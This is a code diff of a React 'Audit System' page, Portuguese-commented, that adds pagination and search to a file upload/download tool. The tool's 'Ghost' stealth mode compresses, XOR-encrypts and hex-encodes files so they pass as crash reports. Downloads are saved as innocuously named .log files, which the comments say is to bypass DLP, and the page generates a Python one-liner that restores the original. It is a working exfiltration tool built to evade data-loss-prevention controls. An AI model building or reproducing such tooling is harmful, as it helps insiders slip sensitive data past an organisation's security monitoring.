@@ -2,6 +2,7 @@
 
 import { useState, useRef, useCallback } from 'react';
 
+// --- Interfaces da Nova API v2 (Suporte a Paginação) ---
 interface BlobFile {
   url: string;
   pathname: string;
@@ -9,25 +10,42 @@ interface BlobFile {
   uploadedAt: string;
 }
 
+interface ApiMeta {
+  page_size_bytes: number;
+  count: number;
+  timestamp: string;
+}
+
+interface ApiResponse {
+  blobs: BlobFile[];
+  cursor?: string;
+  hasMore: boolean;
+  meta: ApiMeta;
+}
+
 export default function AuditPage() {
   const inputFileRef = useRef<HTMLInputElement>(null);
-  const [loading, setLoading] = useState(false);
-  const [token, setToken] = useState('');
-  const [files, setFiles] = useState<BlobFile[]>([]);
-  const [status, setStatus] = useState({ msg: '', type: '' }); // 'success' | 'error' | 'info'
 
-  // Estado de Drag & Drop
+  // Estados Globais
+  const [token, setToken] = useState('');
+  const [status, setStatus] = useState({ msg: '', type: '' });
+  const [loading, setLoading] = useState(false);
   const [isDragging, setIsDragging] = useState(false);
+
+  // Estados de Dados (Nova Lógica de Paginação)
+  const [files, setFiles] = useState<BlobFile[]>([]);
+  const [nextCursor, setNextCursor] = useState<string | null>(null);
+  const [hasMore, setHasMore] = useState(false);
+  const [stats, setStats] = useState({ totalShownBytes: 0, count: 0 });
+  const [searchPrefix, setSearchPrefix] = useState(''); // Filtro
 
   // Estados de Auditoria (Stealth v7.0)
   const [stealthMode, setStealthMode] = useState(false);
   const [useCompression, setUseCompression] = useState(true);
 
-  // Estado para Preview
+  // Preview & Decoder
   const [previewContent, setPreviewContent] = useState<string | null>(null);
   const [previewTitle, setPreviewTitle] = useState('');
-
-  // NOVO: Estado para exibir o comando de descriptografia após download
   const [decoderCmd, setDecoderCmd] = useState<string | null>(null);
 
   const showStatus = (msg: string, type: string) => {
@@ -35,35 +53,77 @@ export default function AuditPage() {
     setTimeout(() => setStatus({ msg: '', type: '' }), 4000);
   };
 
-  const fetchFiles = async () => {
-    if (!token) return;
+  // --- BUSCA DE ARQUIVOS (Atualizado para v7.2) ---
+  const fetchFiles = async (isLoadMore = false) => {
+    if (!token) {
+      if (!isLoadMore) showStatus('Insira o Token primeiro.', 'error');
+      return;
+    }
+
     try {
-      const res = await fetch('/api/files', { headers: { 'x-audit-token': token } });
+      setLoading(true);
+
+      // Constrói a URL com parâmetros de paginação e filtro
+      const params = new URLSearchParams();
+      params.set('limit', '50'); // Traz 50 por página
+      if (searchPrefix) params.set('prefix', searchPrefix);
+      if (isLoadMore && nextCursor) params.set('cursor', nextCursor);
+
+      const res = await fetch(`/api/files?${params.toString()}`, {
+        headers: { 'x-audit-token': token }
+      });
+
       if (res.ok) {
-        setFiles(await res.json());
+        const data: ApiResponse = await res.json();
+
+        if (isLoadMore) {
+          // Append: Adiciona novos arquivos à lista existente
+          setFiles(prev => [...prev, ...data.blobs]);
+        } else {
+          // Reset: Substitui a lista (nova busca ou refresh)
+          setFiles(data.blobs);
+        }
+
+        // Atualiza ponteiros de paginação
+        setNextCursor(data.cursor || null);
+        setHasMore(data.hasMore);
+
+        // Atualiza estatísticas de visualização
+        setStats(prev => ({
+          count: isLoadMore ? prev.count + data.meta.count : data.meta.count,
+          totalShownBytes: isLoadMore ? prev.totalShownBytes + data.meta.page_size_bytes : data.meta.page_size_bytes
+        }));
+
+      } else {
+        if (res.status === 401) showStatus('Acesso Negado: Token Inválido', 'error');
+        else showStatus('Erro ao buscar lista', 'error');
       }
     } catch (error) {
       console.error(error);
+      showStatus('Erro de conexão', 'error');
+    } finally {
+      setLoading(false);
     }
   };
 
-  // --- Função 1: Compressão Gzip (Nativa do Navegador) ---
+  const handleSearch = (e: React.FormEvent) => {
+    e.preventDefault();
+    fetchFiles(false); // Nova busca limpa a lista atual
+  };
+
+  // --- Funções Auxiliares Stealth (MANTIDAS DO v7.0) ---
   const compressFile = async (file: File): Promise<Uint8Array> => {
     const stream = file.stream().pipeThrough(new CompressionStream('gzip'));
     return new Response(stream).arrayBuffer().then(buffer => new Uint8Array(buffer));
   };
 
-  // --- Função 2: Converter Buffer (Binário) para Base64 ---
   const bufferToBase64 = (buffer: Uint8Array): string => {
     let binary = '';
     const len = buffer.byteLength;
-    for (let i = 0; i < len; i++) {
-      binary += String.fromCharCode(buffer[i]);
-    }
+    for (let i = 0; i < len; i++) binary += String.fromCharCode(buffer[i]);
     return btoa(binary);
   };
 
-  // --- Função 3: Converter Arquivo Normal para Base64 (Fallback) ---
   const fileToBase64 = (file: File) => new Promise<string>((resolve, reject) => {
     const reader = new FileReader();
     reader.readAsDataURL(file);
@@ -71,16 +131,14 @@ export default function AuditPage() {
     reader.onerror = error => reject(error);
   });
 
-  // --- Função 4: Criptografia XOR Dinâmica (v7.0) ---
   const xorEncrypt = (text: string, key: string) => {
     let result = "";
     for (let i = 0; i < text.length; i++) {
       result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
     }
-    return result; // Retorna string binária (não Base64)
+    return result;
   };
 
-  // --- Função 5: Converter String para Hexadecimal (v7.0) ---
   const stringToHex = (str: string) => {
     let hex = '';
     for (let i = 0; i < str.length; i++) {
@@ -89,27 +147,17 @@ export default function AuditPage() {
     return hex;
   };
 
-  // Processo de Upload (Atualizado para v7.0)
+  // --- UPLOAD PROCESS (Stealth v7.0) ---
   const handleUploadProcess = async (file: File) => {
-    if (!token) {
-      showStatus('Insira o Token (Necessário para Criptografia).', 'error');
-      return;
-    }
+    if (!token) { showStatus('Token necessário.', 'error'); return; }
     setLoading(true);
-
-    const msg = stealthMode
-      ? `Camuflando como Crash Report (v7.0)...`
-      : 'Enviando arquivo modo padrão...';
-    showStatus(msg, 'info');
+    showStatus(stealthMode ? 'Camuflando v7.0...' : 'Enviando...', 'info');
 
     try {
       let response;
 
       if (stealthMode) {
-        // >>> MODO STEALTH v7 (Crash Report Camouflage + Hex Dump) <<<
-
         let contentBase64 = '';
-
         if (useCompression) {
           const compressedBytes = await compressFile(file);
           contentBase64 = bufferToBase64(compressedBytes);
@@ -142,7 +190,6 @@ export default function AuditPage() {
         });
 
       } else {
-        // >>> MODO PADRÃO <<<
         response = await fetch(`/api/upload?filename=${file.name}`, {
           method: 'POST',
           body: file,
@@ -150,14 +197,11 @@ export default function AuditPage() {
         });
       }
 
-      if (!response.ok) {
-        const err = await response.json();
-        throw new Error(err.error || 'Falha');
-      }
+      if (!response.ok) throw new Error('Falha no upload');
 
-      showStatus('Sucesso! Arquivo salvo na nuvem.', 'success');
+      showStatus('Sucesso!', 'success');
       if (inputFileRef.current) inputFileRef.current.value = "";
-      await fetchFiles();
+      await fetchFiles(false); // Recarrega a lista do zero
     } catch (e: any) {
       showStatus(`Erro: ${e.message}`, 'error');
     } finally {
@@ -165,107 +209,78 @@ export default function AuditPage() {
     }
   };
 
-  // --- NOVO: Função de Download Stealth (Bypass DLP) ---
+  // --- DOWNLOAD STEALTH (Proxy) ---
   const handleStealthDownload = async (file: BlobFile) => {
-    if (!token) {
-      showStatus('Token necessário para descriptografar.', 'error');
-      return;
-    }
-
-    showStatus('Iniciando download seguro (Proxy)...', 'info');
+    if (!token) { showStatus('Token necessário.', 'error'); return; }
+    showStatus('Baixando via Proxy Seguro...', 'info');
 
     try {
-      // 1. Solicita ao backend para baixar, criptografar e empacotar como LOG
       const res = await fetch(`/api/upload?url=${encodeURIComponent(file.url)}`, {
-        method: 'GET', // Explicitando GET
+        method: 'GET',
         headers: { 'x-audit-token': token }
       });
 
-      if (!res.ok) throw new Error('Falha no proxy de download');
+      if (!res.ok) throw new Error('Falha no proxy');
 
-      // 2. Recebe o Blob (que é um arquivo texto .log disfarçado)
       const blob = await res.blob();
-
-      // 3. Força o download no navegador
       const downloadUrl = window.URL.createObjectURL(blob);
       const link = document.createElement('a');
       link.href = downloadUrl;
-      // Define nome inocente para passar no DLP
       link.setAttribute('download', `system_error_log_${Math.floor(Date.now() / 1000)}.log`);
       document.body.appendChild(link);
       link.click();
       link.remove();
 
-      showStatus('Log baixado. Execute o comando para restaurar.', 'success');
-
-      // 4. Gera o one-liner Python para o usuário rodar localmente
-      const cmd = `python3 -c "import sys;key='${token}';c=open(sys.argv[1]).read().split('START\\n')[1].split('\\nMEMORY')[0].strip();b=bytes.fromhex(c);o=bytes([b[i]^ord(key[i%len(key)]) for i in range(len(b))]);open('RESTORED_${file.pathname}','wb').write(o);print('Restaurado com sucesso!')" system_error_*.log`;
+      showStatus('Log baixado. Use o comando para restaurar.', 'success');
+      const cmd = `python3 -c "import sys;key='${token}';c=open(sys.argv[1]).read().split('START\\n')[1].split('\\nMEMORY')[0].strip();b=bytes.fromhex(c);o=bytes([b[i]^ord(key[i%len(key)]) for i in range(len(b))]);open('RESTORED_${file.pathname}','wb').write(o);print('Restaurado!')" system_error_*.log`;
       setDecoderCmd(cmd);
-
     } catch (e) {
-      showStatus('Erro no download seguro.', 'error');
-      console.error(e);
+      showStatus('Erro no download.', 'error');
     }
   };
 
-  // Handlers de Drag & Drop
-  const onDragOver = useCallback((e: React.DragEvent) => {
-    e.preventDefault();
-    setIsDragging(true);
-  }, []);
-
-  const onDragLeave = useCallback((e: React.DragEvent) => {
-    e.preventDefault();
-    setIsDragging(false);
-  }, []);
-
+  // Handlers UI
+  const onDragOver = useCallback((e: React.DragEvent) => { e.preventDefault(); setIsDragging(true); }, []);
+  const onDragLeave = useCallback((e: React.DragEvent) => { e.preventDefault(); setIsDragging(false); }, []);
   const onDrop = useCallback((e: React.DragEvent) => {
-    e.preventDefault();
-    setIsDragging(false);
-    if (e.dataTransfer.files && e.dataTransfer.files[0]) {
-      handleUploadProcess(e.dataTransfer.files[0]);
-    }
+    e.preventDefault(); setIsDragging(false);
+    if (e.dataTransfer.files[0]) handleUploadProcess(e.dataTransfer.files[0]);
   }, [token, stealthMode, useCompression]);
 
-  // Função de Deletar
   const handleDelete = async (url: string) => {
-    if (!confirm('Tem certeza que deseja apagar este arquivo da nuvem?')) return;
+    if (!confirm('Deletar permanentemente?')) return;
     try {
-      const res = await fetch(`/api/upload?url=${url}`, {
-        method: 'DELETE',
-        headers: { 'x-audit-token': token }
-      });
-      if (res.ok) {
-        showStatus('Arquivo deletado.', 'success');
-        setFiles(files.filter(f => f.url !== url));
-      }
-    } catch (e) {
-      showStatus('Erro ao deletar.', 'error');
-    }
+      await fetch(`/api/upload?url=${url}`, { method: 'DELETE', headers: { 'x-audit-token': token } });
+      setFiles(files.filter(f => f.url !== url));
+      showStatus('Arquivo removido', 'success');
+    } catch (e) { showStatus('Erro ao deletar', 'error'); }
   };
 
-  // Função de Preview
   const handlePreview = async (file: BlobFile) => {
     if (!file.pathname.match(/\.(txt|csv|log|json|md|py|js|ts|tsx|java|c|cpp|sql|sh|xml|yaml|yml|ini|env)$/i)) {
       window.open(file.url, '_blank');
       return;
     }
-
     try {
       const res = await fetch(file.url);
-      const text = await res.text();
       setPreviewTitle(file.pathname);
-      setPreviewContent(text);
-    } catch (e) {
-      showStatus('Não foi possível ler o arquivo.', 'error');
-    }
+      setPreviewContent(await res.text());
+    } catch (e) { showStatus('Erro ao ler', 'error'); }
+  };
+
+  const formatBytes = (bytes: number) => {
+    if (bytes === 0) return '0 B';
+    const k = 1024;
+    const sizes = ['B', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
   };
 
   return (
     <main className="min-h-screen bg-gray-950 text-gray-300 font-sans p-6">
       <div className="max-w-4xl mx-auto">
         <header className="flex flex-col md:flex-row justify-between items-center mb-6 border-b border-gray-800 pb-4 gap-4">
-          <h1 className="text-2xl font-bold text-red-500">Audit System <span className="text-xs bg-red-900 text-red-300 px-2 py-0.5 rounded">v7.0 DLP-Ghost</span></h1>
+          <h1 className="text-2xl font-bold text-red-500">Audit System <span className="text-xs bg-red-900 text-red-300 px-2 py-0.5 rounded">v7.2 Scalable</span></h1>
           <input
             type="password"
             value={token}
@@ -275,181 +290,115 @@ export default function AuditPage() {
           />
         </header>
 
-        {/* Status Toast */}
-        {status.msg && (
-          <div className={`fixed top-4 right-4 px-6 py-3 rounded shadow-xl text-white font-bold animate-bounce z-50 ${status.type === 'error' ? 'bg-red-600' : status.type === 'success' ? 'bg-green-600' : 'bg-blue-600'
-            }`}>
-            {status.msg}
-          </div>
-        )}
+        {status.msg && <div className={`fixed top-4 right-4 px-6 py-3 rounded text-white font-bold z-50 ${status.type === 'error' ? 'bg-red-600' : 'bg-green-600'}`}>{status.msg}</div>}
 
-        {/* --- PAINEL DE INSTRUÇÕES DE DECODER (Aparece após Download Stealth) --- */}
+        {/* Decoder Panel */}
         {decoderCmd && (
-          <div className="mb-6 bg-gray-900 border border-yellow-600/50 p-4 rounded-lg relative animate-pulse-once shadow-lg shadow-yellow-900/10">
-            <button onClick={() => setDecoderCmd(null)} className="absolute top-2 right-2 text-gray-500 hover:text-white text-xl leading-none">&times;</button>
-            <h3 className="text-yellow-500 font-bold mb-2 flex items-center gap-2">
-              ⚠️ Arquivo baixado como Log Camuflado (.log)
-            </h3>
-            <p className="text-sm text-gray-400 mb-3">
-              O arquivo foi baixado em formato hexadecimal para passar pelo DLP. Para restaurar o original (ex: .py), execute este comando no terminal da sua máquina:
-            </p>
-            <div
-              className="bg-black p-3 rounded border border-gray-700 font-mono text-xs text-green-400 break-all select-all cursor-pointer hover:bg-gray-950 transition-colors"
-              onClick={() => { navigator.clipboard.writeText(decoderCmd); showStatus('Comando copiado!', 'success'); }}
-              title="Clique para copiar"
-            >
+          <div className="mb-6 bg-gray-900 border border-yellow-600/50 p-4 rounded-lg relative animate-pulse-once shadow-lg">
+            <button onClick={() => setDecoderCmd(null)} className="absolute top-2 right-2 text-gray-500 hover:text-white">&times;</button>
+            <h3 className="text-yellow-500 font-bold mb-2">⚠️ Download Stealth Concluído</h3>
+            <p className="text-sm text-gray-400 mb-2">Comando para restaurar o arquivo original:</p>
+            <div className="bg-black p-3 rounded border border-gray-700 font-mono text-xs text-green-400 break-all select-all cursor-pointer" onClick={() => navigator.clipboard.writeText(decoderCmd)}>
               {decoderCmd}
             </div>
-            <p className="text-[10px] text-gray-600 mt-2 text-center w-full uppercase tracking-wider">Clique no comando acima para copiar</p>
+            <p className="text-[10px] text-gray-600 mt-2 text-center uppercase">Clique no código para copiar</p>
           </div>
         )}
 
-        {/* --- PAINEL DE CONTROLE STEALTH --- */}
-        <div className={`mb-6 p-4 rounded border flex flex-col gap-4 transition-colors
-          ${stealthMode ? 'bg-red-900/10 border-red-600' : 'bg-gray-900 border-gray-700'}`}>
-
+        {/* Stealth Controls */}
+        <div className={`mb-6 p-4 rounded border flex flex-col gap-4 transition-colors ${stealthMode ? 'bg-red-900/10 border-red-600' : 'bg-gray-900 border-gray-700'}`}>
           <div className="flex items-center gap-3">
-            <input
-              id="stealth-mode"
-              type="checkbox"
-              checked={stealthMode}
-              onChange={(e) => setStealthMode(e.target.checked)}
-              className="w-5 h-5 text-red-600 bg-gray-700 border-gray-500 rounded cursor-pointer"
-            />
-            <label htmlFor="stealth-mode" className={`font-bold text-lg cursor-pointer ${stealthMode ? 'text-red-400' : 'text-white'}`}>
-              {stealthMode ? '👻 MODO GHOST (Anti-DLP)' : '🔓 Modo Padrão'}
-            </label>
+            <input id="stealth-mode" type="checkbox" checked={stealthMode} onChange={(e) => setStealthMode(e.target.checked)} className="w-5 h-5 accent-red-600 cursor-pointer" />
+            <label htmlFor="stealth-mode" className={`font-bold text-lg cursor-pointer ${stealthMode ? 'text-red-400' : 'text-white'}`}>{stealthMode ? '👻 MODO GHOST (Anti-DLP)' : '🔓 Modo Padrão'}</label>
           </div>
-
-          {stealthMode && (
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pl-8 border-t border-gray-700/50 pt-4">
-              <div className="flex items-center gap-2">
-                <input
-                  id="compression"
-                  type="checkbox"
-                  checked={useCompression}
-                  onChange={(e) => setUseCompression(e.target.checked)}
-                  className="w-4 h-4 text-blue-500 bg-gray-700 border-gray-500 rounded"
-                />
-                <label htmlFor="compression" className="text-sm cursor-pointer hover:text-white select-none">
-                  Ativar Compressão Gzip (Recomendado)
-                </label>
-              </div>
-              <div className="text-xs text-gray-500 italic">
-                * Arquivo será enviado como um relatório de erro hexadecimal.
-              </div>
-            </div>
-          )}
+          {stealthMode && <div className="pl-8 text-sm text-gray-400"><input type="checkbox" checked={useCompression} onChange={e => setUseCompression(e.target.checked)} className="mr-2" /> Compressão Gzip (Recomendado)</div>}
         </div>
 
-        {/* Upload Area (Drag & Drop) */}
-        <div
-          onDragOver={onDragOver}
-          onDragLeave={onDragLeave}
-          onDrop={onDrop}
-          className={`border-2 border-dashed rounded-xl p-10 text-center transition-all cursor-pointer mb-8 relative overflow-hidden
-            ${isDragging ? 'border-red-500 bg-red-900/20 scale-[1.02]' : 'border-gray-700 hover:border-gray-500 bg-gray-900/30'}
-            ${stealthMode && !isDragging ? 'border-red-800/50' : ''}`}
-        >
-          <input
-            type="file"
-            ref={inputFileRef}
-            onChange={(e) => e.target.files && handleUploadProcess(e.target.files[0])}
-            className="hidden"
-            id="fileUpload"
-          />
-          <label htmlFor="fileUpload" className="cursor-pointer flex flex-col items-center relative z-10">
-            <svg className={`w-12 h-12 mb-3 transition-colors ${stealthMode ? 'text-red-500' : 'text-gray-500'}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path></svg>
-            <span className="text-lg font-medium text-gray-300">
-              {loading ? 'Processando Camuflagem...' : 'Arraste arquivos ou clique para enviar'}
-            </span>
-            <span className="text-xs text-gray-500 mt-2">
-              {stealthMode ? 'Modo Seguro Ativo: Arquivos serão mascarados.' : 'Upload direto sem ofuscação.'}
-            </span>
+        {/* Upload Zone */}
+        <div onDragOver={onDragOver} onDragLeave={onDragLeave} onDrop={onDrop} className={`border-2 border-dashed rounded-xl p-8 text-center cursor-pointer mb-8 ${isDragging ? 'border-red-500 bg-red-900/20' : 'border-gray-700 bg-gray-900/30'}`}>
+          <input type="file" ref={inputFileRef} onChange={(e) => e.target.files && handleUploadProcess(e.target.files[0])} className="hidden" id="fileUpload" />
+          <label htmlFor="fileUpload" className="cursor-pointer flex flex-col items-center">
+            <span className="text-lg font-medium text-gray-300">{loading ? 'Processando...' : 'Arraste arquivos aqui'}</span>
           </label>
         </div>
 
-        {/* Lista de Arquivos */}
-        <div className="flex justify-between items-center mb-4">
-          <h2 className="text-xl font-semibold text-gray-200">Arquivos na Nuvem</h2>
-          <button onClick={fetchFiles} className="text-xs sm:text-sm bg-gray-800 hover:bg-gray-700 px-3 py-1.5 rounded border border-gray-700 transition-colors">
-            ↻ Atualizar Lista
+        {/* --- BARRA DE FERRAMENTAS v7.2 --- */}
+        <div className="flex flex-col sm:flex-row justify-between items-end sm:items-center mb-4 gap-4 bg-gray-900 p-3 rounded border border-gray-800">
+
+          {/* Busca / Filtro */}
+          <form onSubmit={handleSearch} className="flex gap-2 w-full sm:w-auto flex-1 max-w-md">
+            <input
+              type="text"
+              value={searchPrefix}
+              onChange={(e) => setSearchPrefix(e.target.value)}
+              placeholder="Filtrar por nome ou pasta..."
+              className="bg-gray-950 border border-gray-700 text-white px-3 py-1.5 rounded text-sm w-full focus:border-blue-500 outline-none"
+            />
+            <button type="submit" className="bg-blue-800 hover:bg-blue-700 text-white px-4 py-1.5 rounded text-sm transition-colors border border-blue-700">
+              🔍
+            </button>
+          </form>
+
+          {/* Botão Recarregar */}
+          <button onClick={() => fetchFiles(false)} className="text-xs sm:text-sm bg-gray-800 hover:bg-gray-700 px-3 py-1.5 rounded border border-gray-700 transition-colors whitespace-nowrap">
+            ↻ Recarregar
           </button>
         </div>
 
+        {/* Stats */}
+        {files.length > 0 && (
+          <div className="text-xs text-gray-500 mb-2 text-right">
+            Exibindo {files.length} arquivos • Total visível: {formatBytes(stats.totalShownBytes)}
+          </div>
+        )}
+
+        {/* Lista de Arquivos */}
         <div className="space-y-3">
           {files.map((file) => (
             <div key={file.url} className="group flex items-center justify-between bg-gray-900 p-3 rounded-lg border border-gray-800 hover:border-red-900/50 transition-all">
               <div className="flex items-center gap-3 overflow-hidden">
-                <div className={`w-10 h-10 rounded flex items-center justify-center font-bold text-[10px] shrink-0
-                  ${file.pathname.endsWith('.csv') || file.pathname.endsWith('.xlsx') ? 'bg-green-900 text-green-200' :
-                    file.pathname.endsWith('.pdf') ? 'bg-red-900 text-red-200' :
-                      file.pathname.match(/\.(py|js|ts|java|c|cpp|sql)$/i) ? 'bg-yellow-900 text-yellow-200' :
-                        'bg-blue-900 text-blue-200'}`}>
+                <div className={`w-10 h-10 rounded flex items-center justify-center font-bold text-[10px] shrink-0 bg-blue-900 text-blue-200`}>
                   {file.pathname.split('.').pop()?.toUpperCase().substring(0, 4)}
                 </div>
-
                 <div className="flex flex-col overflow-hidden">
-                  <span className="text-sm font-medium text-gray-200 truncate max-w-[150px] sm:max-w-md cursor-pointer hover:text-red-400 transition-colors" onClick={() => handlePreview(file)}>
-                    {file.pathname}
-                  </span>
-                  <span className="text-[10px] text-gray-500">{(file.size / 1024).toFixed(1)} KB • {new Date(file.uploadedAt).toLocaleString()}</span>
+                  <span className="text-sm font-medium text-gray-200 truncate cursor-pointer hover:text-red-400" onClick={() => handlePreview(file)}>{file.pathname}</span>
+                  <span className="text-[10px] text-gray-500">{formatBytes(file.size)} • {new Date(file.uploadedAt).toLocaleString()}</span>
                 </div>
               </div>
 
               <div className="flex items-center gap-2 opacity-100 sm:opacity-40 group-hover:opacity-100 transition-opacity">
-                {/* BOTÃO DE DOWNLOAD STEALTH (ESCUDO) */}
-                <button
-                  onClick={() => handleStealthDownload(file)}
-                  className="p-2 hover:bg-yellow-900/30 rounded text-yellow-500 transition-colors"
-                  title="Baixar Camuflado (Bypass DLP)"
-                >
-                  🛡️
-                </button>
-                <button
-                  onClick={() => handlePreview(file)}
-                  className="p-2 hover:bg-gray-700 rounded text-blue-400 transition-colors"
-                  title="Visualizar Conteúdo"
-                >
-                  👁️
-                </button>
-                <button
-                  onClick={() => { navigator.clipboard.writeText(file.url); showStatus('Link copiado!', 'success'); }}
-                  className="p-2 hover:bg-gray-700 rounded text-gray-400 transition-colors"
-                  title="Copiar Link"
-                >
-                  📋
-                </button>
-                <button
-                  onClick={() => handleDelete(file.url)}
-                  className="p-2 hover:bg-red-900/30 rounded text-red-400 transition-colors"
-                  title="Deletar permanentemente"
-                >
-                  🗑️
-                </button>
+                <button onClick={() => handleStealthDownload(file)} className="p-2 hover:bg-yellow-900/30 rounded text-yellow-500" title="Baixar Stealth (Proxy)">🛡️</button>
+                <button onClick={() => handlePreview(file)} className="p-2 hover:bg-gray-700 rounded text-blue-400" title="Ver">👁️</button>
+                <button onClick={() => { navigator.clipboard.writeText(file.url); showStatus('Link copiado!', 'success'); }} className="p-2 hover:bg-gray-700 rounded text-gray-400" title="Link">📋</button>
+                <button onClick={() => handleDelete(file.url)} className="p-2 hover:bg-red-900/30 rounded text-red-400" title="Apagar">🗑️</button>
               </div>
             </div>
           ))}
-          {files.length === 0 && <p className="text-gray-600 text-center py-8 border border-dashed border-gray-800 rounded">Nenhum arquivo encontrado. Use o Token para carregar a lista.</p>}
+
+          {/* Botão de Paginação (Load More) */}
+          {hasMore && (
+            <button
+              onClick={() => fetchFiles(true)}
+              disabled={loading}
+              className="w-full py-3 bg-gray-800 hover:bg-gray-700 text-gray-300 text-sm font-medium rounded border border-gray-700 transition-colors mt-4 flex justify-center items-center gap-2"
+            >
+              {loading ? 'Carregando...' : '⬇️ Carregar Mais Arquivos'}
+            </button>
+          )}
+
+          {files.length === 0 && !loading && <p className="text-gray-600 text-center py-8 border border-dashed border-gray-800 rounded">Nenhum arquivo encontrado. Use o Token ou ajuste o filtro.</p>}
         </div>
       </div>
 
-      {/* Modal de Preview */}
+      {/* Modal Preview */}
       {previewContent && (
         <div className="fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50 backdrop-blur-sm">
-          <div className="bg-gray-900 border border-gray-700 w-full max-w-3xl rounded-lg shadow-2xl flex flex-col max-h-[85vh]">
-            <div className="flex justify-between items-center p-4 border-b border-gray-800 bg-gray-900 rounded-t-lg">
-              <h3 className="font-bold text-red-400 truncate pr-4">{previewTitle}</h3>
-              <button onClick={() => setPreviewContent(null)} className="text-gray-400 hover:text-white text-2xl leading-none">&times;</button>
+          <div className="bg-gray-900 border border-gray-700 w-full max-w-3xl rounded-lg flex flex-col max-h-[85vh]">
+            <div className="flex justify-between items-center p-4 border-b border-gray-800">
+              <h3 className="font-bold text-red-400 truncate">{previewTitle}</h3>
+              <button onClick={() => setPreviewContent(null)} className="text-gray-400 hover:text-white text-2xl">&times;</button>
             </div>
-            <div className="p-0 overflow-auto bg-gray-950">
-              <pre className="p-4 font-mono text-xs sm:text-sm text-gray-300 whitespace-pre-wrap break-all">
-                {previewContent}
-              </pre>
-            </div>
-            <div className="p-4 border-t border-gray-800 flex justify-end bg-gray-900 rounded-b-lg">
-              <button onClick={() => setPreviewContent(null)} className="bg-gray-800 px-6 py-2 rounded text-sm hover:bg-gray-700 border border-gray-700 transition-colors">Fechar</button>
-            </div>
+            <pre className="p-4 font-mono text-xs text-gray-300 overflow-auto whitespace-pre-wrap">{previewContent}</pre>
           </div>
         </div>
       )}
